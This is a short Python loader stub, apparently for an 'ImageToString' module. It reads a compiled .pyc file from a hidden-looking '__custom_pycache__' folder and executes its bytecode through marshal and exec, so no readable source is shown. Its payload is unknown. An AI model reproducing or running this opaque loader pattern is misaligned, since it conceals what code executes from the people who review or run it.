
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'ImageToString_d96bc1e8e73844d189ece870d4acbad6.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
